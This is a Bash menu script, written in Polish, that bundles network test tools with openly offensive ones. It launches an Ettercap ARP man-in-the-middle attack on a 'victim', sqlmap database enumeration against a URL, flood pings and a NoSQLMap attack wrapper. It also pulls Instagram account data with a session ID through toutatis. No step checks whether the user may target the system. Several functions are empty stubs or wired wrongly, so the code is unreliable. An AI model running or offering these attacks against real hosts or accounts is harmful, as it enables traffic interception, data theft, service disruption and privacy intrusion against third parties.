#!/bin/bash

# Funkcja do wyświetlania menu i pobierania opcji
show_menu() {
    echo "Wybierz opcję:"
    echo "1. Test Apache Bench"
    echo "2. Test ping"
    echo "3. Monitorowanie wydajności sieciowej"
    echo "4. Sprawdzanie dostępności portów"
    echo "5. Analiza logów"
    echo "6. Testowanie prędkości łącza"
    echo "7. Skanowanie podatności (Nmap)"
    echo "8. Atak typu Man-in-the-Middle (Ettercap)"
    echo "9. Atak typu SQL injection (SQLmap)"
    echo "10. Użycie wszystkich narzędzi na jednym celu"
    echo "11. Pobieranie informacji o koncie Instagrama"  # Nowa opcja
    echo "0. Wyjście"
    read option
}

# Funkcja do uruchamiania NoSQLMap
run_nosqlmap() {
    echo "Uruchamianie NoSQLMap..."
    python /ścieżka/do/nosqlmap.py --attack "$1" --platform "$2" --victim "$3" --dbPort "$4" --myIP "$5" --myPort "$6" --webPort "$7" --uri "$8" --httpMethod "$9" --https "${10}" --verb "${11}" --postData "${12}" --requestHeaders "${13}"
}

# Funkcja do uruchamiania testu Apache Bench
run_ab_test() {
    echo "Wpisz adres URL strony do testowania:"
    read url
    echo "Wpisz liczbę żądań:"
    read num_requests
    echo "Wpisz liczbę jednoczesnych połączeń:"
    read concurrent_connections
    echo "Wybierz format pliku wynikowego (CSV/JSON/HTML):"
    read result_format
    ab -n "$num_requests" -c "$concurrent_connections" -g "ab_results.$result_format" "$url" &
}

# Funkcja do uruchamiania testu ping
run_ping_test() {
    echo "Wpisz adres IP lub nazwę hosta do pingowania:"
    read host
    echo "Wpisz rozmiar pakietów:"
    read packet_size
    echo "Wpisz interwał czasowy (w sekundach):"
    read interval
    echo "Wpisz liczbę powtórzeń:"
    read num_iterations
    ping -f -c "$num_iterations" -s "$packet_size" -i "$interval" "$host" &
}

# Funkcja do monitorowania wydajności sieciowej
network_performance_monitor() {
    echo "Monitorowanie wydajności sieciowej:"
    echo "----------------------------------"
    echo "Wpisz adres IP lub nazwę hosta serwera:"
    read server
    echo "Wpisz parametry transmisji danych (np. -l 1000 -b 10M -t 10s):"
    read transmission_params
    iperf "$transmission_params" "$server"
}

# Funkcja do sprawdzania dostępności portów
check_port_availability() {
    echo "Wpisz adres IP lub nazwę hosta do sprawdzania:"
    read host
    echo "Wpisz początkowy port zakresu:"
    read start_port
    echo "Wpisz końcowy port zakresu:"
    read end_port
    echo "Wybierz protokół (TCP/UDP):"
    read protocol
    for ((port=start_port; port<=end_port; port++))
    do
        echo "Sprawdzanie portu $port:"
        nc -zv "$host" "$port" "$protocol"
    done
}

# Funkcja do analizy logów
analyze_logs() {
    echo "Analiza logów:"
    echo "--------------"
    # Tutaj dodaj kod do analizy logów, generowania raportów itp.
}

# Funkcja do testowania prędkości łącza
speed_test() {
    echo "Testowanie prędkości łącza:"
    echo "---------------------------"
    echo "Wpisz numer serwera do testowania:"
    read server_num
    echo "Wybierz jednostkę prędkości (bps/Kbps/Mbps/Gbps):"
    read speed_unit
    speedtest-cli --server "$server_num" --unit "$speed_unit"
}

# Funkcja do skanowania podatności (Nmap)
vulnerability_scan() {
    echo "Skanowanie podatności (Nmap):"
    echo "------------------------------"
    echo "Wpisz adres IP lub nazwę hosta do skanowania:"
    read target
    echo "Uruchamianie skanowania..."
    nmap "$target"
}

# Funkcja do ataku typu Man-in-the-Middle (Ettercap)
man_in_the_middle_attack() {
    echo "Atak typu Man-in-the-Middle (Ettercap):"
    echo "----------------------------------------"
    echo "Wpisz adres IP lub nazwę hosta ofiary:"
    read victim
    echo "Uruchamianie ataku..."
    ettercap -T -q -M arp:remote /"$victim"/ // &
}

# Funkcja do ataku typu SQL injection (SQLmap)
sql_injection_attack() {
    echo "Atak typu SQL injection (SQLmap):"
    echo "----------------------------------"
    echo "Wpisz adres URL strony do ataku:"
    read target_url
    echo "Uruchamianie ataku..."
    sqlmap -u "$target_url" --dbs
}

# Funkcja do użycia wszystkich narzędzi na jednym celu
use_all_tools() {
    echo "Wpisz adres URL strony do testowania:"
    read url
    run_ab_test "$url"
    run_ping_test "$url"
    network_performance_monitor "$url"
    check_port_availability "$url"
    # Tutaj dodaj wywołania pozostałych funkcji z wykorzystaniem tego samego celu
}

# Funkcja do pobierania informacji o koncie Instagrama
get_instagram_info() {
    echo "Wpisz nazwę użytkownika na Instagramie:"
    read username
    echo "Wpisz identyfikator sesji Instagrama:"
    read session_id
    toutatis -u "$username" -s "$session_id"
}

# Funkcja do wyświetlania szczegółowych wyników wszystkich testów w formie tabeli
display_results_table() {
    echo "Szczegółowe wyniki wszystkich testów:"
    echo "-------------------------------------"
    echo "| Test                 | Wyniki                             |"
    echo "-------------------------------------"
    # Tutaj dodaj kod do wyświetlania wyników wszystkich testów w formie tabeli
}

# Główna pętla programu
while true; do
    show_menu
    case "$option" in
    1)
        run_ab_test
        ;;
    2)
        run_ping_test
        ;;
    3)
        network_performance_monitor
        ;;
    4)
        check_port_availability
        ;;
    5)
        analyze_logs
        ;;
    6)
        speed_test
        ;;
    7)
        vulnerability_scan
        ;;
    8)
        man_in_the_middle_attack
        ;;
    9)
        sql_injection_attack
        ;;
    10)
        use_all_tools
        ;;
    11)
        get_instagram_info  # Nowa opcja wywołania funkcji do pobierania informacji o koncie Instagrama
        ;;
    0)
        display_results_table
        echo "Wyjście z programu..."
        break
        ;;
    *)
        echo "Nieprawidłowa opcja. Spróbuj ponownie."
        ;;
    esac
    wait
done
